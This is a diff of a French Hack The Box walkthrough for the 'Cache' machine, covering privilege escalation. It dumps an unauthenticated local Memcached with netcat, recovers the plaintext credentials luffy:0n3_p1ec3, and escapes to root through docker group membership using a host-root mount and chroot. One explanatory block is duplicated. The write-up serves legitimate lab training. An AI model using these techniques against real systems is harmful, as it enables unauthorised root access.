@@ -1566,35 +1566,19 @@ La partie **Prise pied** s’arrête ici, avec l’obtention du shell de `ash` e
 
 {{< escalade-intro-v2 user="ash" >}}
 
-
-### Observation passive avec pspy64
-
-```bash
-./pspy64
-```
-
-Si système 32 bits :
-
-```bash
-./pspy32
-```
-
 ### Vérification sudo
 
 ```bash
 sudo -l
 ```
 
-### Exploration du contexte utilisateur
+La commande demande le mot de passe de `ash`, puis indique qu’il ne peut exécuter aucune commande avec `sudo` :
 
-```bash
-whoami
-id
-pwd
-uname -a
-hostname
-find /home /opt -type f -readable 2>/dev/null
 ```
+Sorry, user ash may not run sudo on cache.
+```
+
+Cette piste ne permet donc pas d’élever directement les privilèges.
 
 ### Capabilities
 
@@ -1602,17 +1586,32 @@ find /home /opt -type f -readable 2>/dev/null
 getcap -r / 2>/dev/null
 ```
 
+Les capabilities permettent d’accorder à un programme certains privilèges normalement réservés à `root`, sans lui attribuer l’ensemble de ses droits. La recherche ne révèle toutefois aucun binaire exploitable dans ce contexte.
+
 ### SUID
+
+Tu poursuis avec `suid3num.py` afin d’examiner les fichiers possédant le bit SUID :
 
 ```bash
 python3 suid3num.py
 ```
 
-Alternative :
+Un binaire SUID s’exécute avec les privilèges de son propriétaire plutôt qu’avec ceux de l’utilisateur qui le lance. L’outil ne met cependant en évidence aucun binaire personnalisé ou directement exploitable pour obtenir `root`.
 
 ```bash
-find / -perm -4000 -type f 2>/dev/null
+[~] Custom SUID Binaries (Interesting Stuff)
+------------------------------
+------------------------------
+
+
+[#] SUID Binaries found in GTFO bins..
+------------------------------
+[!] None :(
+------------------------------
+
 ```
+
+
 
 ### Services locaux
 
@@ -1620,106 +1619,357 @@ find / -perm -4000 -type f 2>/dev/null
 ss -tulnp
 ```
 
-Alternative :
+Cette commande affiche les sockets TCP et UDP en écoute ainsi que leurs adresses et leurs ports. Elle permettra notamment de repérer les services accessibles uniquement depuis la machine locale.
+
+Voici le résultat :
 
 ```bash
-netstat -tulnp
+Netid  State    Recv-Q   Send-Q                           Local Address:Port                                    Peer Address:Port                               
+udp    UNCONN   0        0                                127.0.0.53%lo:53                                           0.0.0.0:*                                  
+udp    UNCONN   0        0                           10.129.1.52%ens160:68                                           0.0.0.0:*                                  
+udp    UNCONN   0        0           [fe80::a0de:adff:feba:ff70]%ens160:546                                             [::]:*                                  
+tcp    LISTEN   0        128                              127.0.0.53%lo:53                                           0.0.0.0:*                                  
+tcp    LISTEN   0        128                                    0.0.0.0:22                                           0.0.0.0:*                                  
+tcp    LISTEN   0        80                                   127.0.0.1:3306                                         0.0.0.0:*                                  
+tcp    LISTEN   0        128                                  127.0.0.1:11211                                        0.0.0.0:*                                  
+tcp    LISTEN   0        128                                       [::]:22                                              [::]:*                                  
+tcp    LISTEN   0        128                                          *:80                                                 *:*       
 ```
 
-### Recherche d’un service derrière un port local
+Les ports `22` et `80` correspondent aux services déjà identifiés pendant l’énumération initiale.
 
-Exemple avec le port `8080` :
+Deux autres services écoutent uniquement sur l’interface locale :
+
+```
+127.0.0.1:3306
+127.0.0.1:11211
+```
+
+Le port `3306` correspond à MySQL, utilisé par OpenEMR. Le port `11211` mérite davantage d’attention, car il est généralement associé au service de cache **Memcached**.
+
+Comme ce service n’est accessible que depuis la machine locale, il n’apparaissait pas lors de l’énumération externe. Le shell de `ash` permet désormais de l’interroger directement.
+
+Les ports `22` et `80` correspondent aux services déjà identifiés pendant l’énumération initiale.
+
+Deux autres services écoutent uniquement sur l’interface locale :
+
+```
+127.0.0.1:3306
+127.0.0.1:11211
+```
+
+Le port `3306` correspond à MySQL, utilisé par OpenEMR. Le port `11211` mérite davantage d’attention, car il est généralement associé au service de cache **Memcached**.
+
+Comme ce service n’est accessible que depuis la machine locale, il n’apparaissait pas lors de l’énumération externe. Le shell de `ash` permet désormais de l’interroger directement.
+
+### Identification du service Memcached
+
+Le port `11211` est généralement utilisé par **Memcached**, un service de cache en mémoire. Pour vérifier qu’il s’agit bien de ce service et connaître sa version, tu lui envoies la commande `version` :
 
 ```bash
-grep -r ':8080' /etc 2>/dev/null
+printf 'version\r\nquit\r\n' | nc 127.0.0.1 11211
 ```
 
-Recherche élargie :
+La commande construit deux instructions destinées au protocole texte de Memcached :
+
+```txt
+version
+quit
+```
+
+Les séquences `\r\n` représentent les fins de ligne attendues par le service. Le tube `|` transmet ces commandes à Netcat, qui ouvre une connexion TCP vers `127.0.0.1` sur le port `11211`.
+
+Le serveur répond :
+
+```txt
+VERSION 1.5.6 Ubuntu
+```
+
+Cette réponse confirme qu’un service Memcached est actif localement dans la version suivante :
+
+```txt
+1.5.6 Ubuntu
+```
+
+Memcached est utilisé par les applications pour stocker temporairement en mémoire des informations fréquemment consultées. Les données y sont enregistrées sous la forme de couples **clé-valeur**.
+
+Par exemple, une clé nommée `user` pourrait être associée à un nom d’utilisateur, tandis qu’une clé `passwd` pourrait contenir un mot de passe.
+
+Dans une configuration normale, ces données sont destinées à l’application elle-même. Ici, le service écoute uniquement sur l’interface locale, mais il ne demande aucune authentification. L’utilisateur `ash` peut donc interroger directement son contenu.
+
+### Énumération des objets stockés dans Memcached
+
+Maintenant que le service Memcached est identifié, tu peux vérifier s’il contient des objets accessibles.
+
+Tu commences par demander les statistiques liées aux éléments actuellement stockés :
 
 ```bash
-grep -r '8080' /etc 2>/dev/null
+printf 'stats items\r\nquit\r\n' | nc 127.0.0.1 11211
 ```
 
-### Tunnel SSH vers un service local
+La sortie contient notamment :
 
-Exemple avec un service local sur `127.0.0.1:8080` :
+```
+STAT items:1:number 5
+STAT items:1:number_hot 0
+STAT items:1:number_warm 0
+STAT items:1:number_cold 5
+STAT items:1:age_hot 0
+STAT items:1:age_warm 0
+STAT items:1:age 16
+STAT items:1:evicted 0
+STAT items:1:evicted_nonzero 0
+STAT items:1:evicted_time 0
+STAT items:1:outofmemory 0
+STAT items:1:tailrepairs 0
+STAT items:1:reclaimed 0
+STAT items:1:expired_unfetched 0
+STAT items:1:evicted_unfetched 0
+STAT items:1:evicted_active 0
+STAT items:1:crawler_reclaimed 0
+STAT items:1:crawler_items_checked 108
+STAT items:1:lrutail_reflocked 0
+STAT items:1:moves_to_cold 1989
+STAT items:1:moves_to_warm 0
+STAT items:1:moves_within_lru 0
+STAT items:1:direct_reclaims 0
+STAT items:1:hits_to_hot 0
+STAT items:1:hits_to_warm 0
+STAT items:1:hits_to_cold 0
+STAT items:1:hits_to_temp 0
+END
+```
+
+La ligne la plus importante est :
+
+```
+STAT items:1:number 5
+```
+
+Elle indique que le slab `1` contient actuellement cinq objets.
+
+Un **slab** est une zone utilisée par Memcached pour regrouper en mémoire les objets de taille similaire. L’identifiant `1` désigne ici le slab dans lequel les cinq objets ont été stockés.
+
+Tu peux maintenant demander à Memcached d’afficher les clés présentes dans ce slab :
+
+```
+printf 'stats cachedump 1 100\r\nquit\r\n' | nc 127.0.0.1 11211
+```
+
+Le premier argument, `1`, correspond à l’identifiant du slab. Le second, `100`, indique le nombre maximal d’objets à afficher.
+
+La commande retourne :
+
+```
+ITEM link [21 b; 0 s]
+ITEM user [5 b; 0 s]
+ITEM passwd [9 b; 0 s]
+ITEM file [7 b; 0 s]
+ITEM account [9 b; 0 s]
+END
+```
+
+Cinq clés sont donc disponibles :
+
+```
+link
+user
+passwd
+file
+account
+```
+
+Les clés `user`, `passwd` et `account` paraissent particulièrement intéressantes. Tu peux maintenant récupérer la valeur associée à chacune d’elles.
+
+### Récupération des valeurs stockées dans Memcached
+
+Pour lire les valeurs associées aux cinq clés, tu utilises une boucle qui envoie successivement une commande `get` à Memcached :
 
 ```bash
-ssh -L 8080:127.0.0.1:8080 user@target
+for key in link user passwd file account; do
+  echo "===== $key ====="
+  printf "get %s\r\nquit\r\n" "$key" | nc 127.0.0.1 11211
+done
 ```
 
-Accès depuis Kali :
-
-```text
-http://localhost:8080
-```
-
-### Linpeas
+La sortie révèle le contenu suivant :
 
 ```bash
-./linpeas.sh
+===== link =====
+VALUE link 0 21
+https://hackthebox.eu
+END
+
+===== user =====
+VALUE user 0 5
+luffy
+END
+
+===== passwd =====
+VALUE passwd 0 9
+0n3_p1ec3
+END
+
+===== file =====
+VALUE file 0 7
+nothing
+END
+
+===== account =====
+VALUE account 0 9
+afhj556uo
+END
 ```
 
-### Dernier recours : le kernel
+Chaque réponse commence par une ligne de la forme :
+
+```
+VALUE <clé> <flags> <taille>
+```
+
+Elle indique le nom de la clé demandée, les éventuels flags associés et la taille de la valeur en octets. La ligne suivante contient la valeur elle-même, puis `END` marque la fin de la réponse.
+
+Parmi les données récupérées, les clés `user` et `passwd` fournissent un nouveau couple d’identifiants :
+
+```txt
+luffy:0n3_p1ec3
+```
+
+Comme `luffy` a déjà été identifié comme un utilisateur local dans `/home`, tu peux maintenant tester ces identifiants avec `su`.
+
+### Passage de `ash` à `luffy`
+
+Tu testes les identifiants récupérés dans Memcached en changeant d’utilisateur :
 
 ```bash
-uname -a
-./les.sh
+su - luffy
 ```
 
-### Conclusion de l’énumération privilege escalation
+Lorsque le mot de passe est demandé, tu saisis :
 
-À la fin de cette phase, tu peux résumer les pistes testées :
-
-* sudo
-* contexte utilisateur
-* fichiers lisibles
-* capabilities
-* SUID
-* cron et timers
-* services locaux
-* LinPEAS
-* kernel
-
-Dans ce cas précis, la piste exploitable est :
-
-```text
-<résumer ici la piste réellement exploitée>
+```
+0n3_p1ec3
 ```
 
-### Exploitation de la piste identifiée
+L’authentification réussit et tu obtiens un shell sous le compte `luffy` :
 
-Tu exploites ensuite la mauvaise configuration identifiée pendant l’énumération.
-
-```bash
-<commandes d’exploitation>
+```
+luffy@cache:~$
 ```
 
-Tu confirmes l’élévation de privilèges :
+Tu vérifies ensuite l’identité et les groupes de ce nouvel utilisateur :
 
-```bash
-whoami
+```
 id
-hostname
 ```
 
-Résultat attendu :
+La sortie montre notamment que `luffy` appartient au groupe :
 
-```text
-root
+```
+uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)
+```
+
+Cette appartenance mérite une attention particulière. Un membre du groupe `docker` peut généralement communiquer avec le démon Docker et créer des conteneurs. Comme ce démon fonctionne avec les privilèges de `root`, cet accès peut souvent être détourné pour agir directement sur le système hôte.
+
+Tu vas donc vérifier si `luffy` peut réellement utiliser Docker.
+
+### Vérification de l’accès au démon Docker
+
+Tu commences par vérifier si `luffy` peut communiquer avec Docker :
+
+```bash
+docker ps
+```
+
+La commande ne retourne aucun conteneur en cours d’exécution, mais elle ne produit pas non plus d’erreur de permission. Cela confirme que `luffy` peut accéder au démon Docker.
+
+Tu vérifies ensuite les images disponibles localement :
+
+```bash
+docker images
+```
+
+La sortie montre la présence de l’image suivante :
+
+```bash
+REPOSITORY   TAG      IMAGE ID       CREATED        SIZE
+ubuntu       latest   2ca708c1c9cc   6 years ago    64.2MB
+```
+
+Aucun conteneur n’est actuellement lancé, mais l’image `ubuntu:latest` est disponible et peut être utilisée pour en créer un nouveau.
+
+L’objectif consiste maintenant à monter la racine du système hôte dans ce conteneur, puis à l’utiliser comme nouvelle racine avec `chroot`.
+
+### Montage du système de fichiers hôte dans un conteneur
+
+Comme `luffy` peut utiliser Docker et que l’image `ubuntu:latest` est disponible localement, tu peux créer un conteneur en montant la racine du système hôte dans son arborescence :
+
+```bash
+docker run --rm -it \
+  -v /:/mnt/host \
+  ubuntu:latest \
+  chroot /mnt/host /bin/bash
+```
+
+Cette commande se décompose ainsi :
+
+```txt
+docker run
+```
+
+crée et démarre un nouveau conteneur ;
+
+```txt
+--rm
+```
+
+supprime automatiquement le conteneur lorsqu’il se termine ;
+
+```txt
+-it
+```
+
+ouvre un terminal interactif ;
+
+```txt
+-v /:/mnt/host
+```
+
+monte la racine `/` de la machine hôte dans le conteneur sous le chemin `/mnt/host` ;
+
+```txt
+ubuntu:latest
+```
+
+indique l’image utilisée pour créer le conteneur ;
+
+```txt
+chroot /mnt/host /bin/bash
+```
+
+utilise le système de fichiers monté sous `/mnt/host` comme nouvelle racine et y lance `/bin/bash`.
+
+Le démon Docker s’exécute avec les privilèges de `root`. Le conteneur peut donc monter la racine complète de la machine hôte, puis `chroot` permet d’exécuter un shell directement dans cette arborescence.
+
+Tu obtiens ainsi un shell disposant des privilèges de `root` sur le système hôte.
+
+Tu peux le vérifier avec :
+
+```
+root@c28626745b44:/# id
 uid=0(root) gid=0(root) groups=0(root)
-machine
 ```
 
 ### root.txt
 
-Une fois root, tu peux lire le flag final :
+Tu peux maintenant lire le flag root :
 
-```bash
-cat /root/root.txt
+```
+root@c28626745b44:/# cat /root/root.txt
+190cxxxxxxxxxxxxxxxxxxxxxxxxxxxx5d33
 ```
 
-Cette étape termine l’escalade de privilèges.
+La machine est maintenant entièrement compromise.
 
 ## Conclusion
 
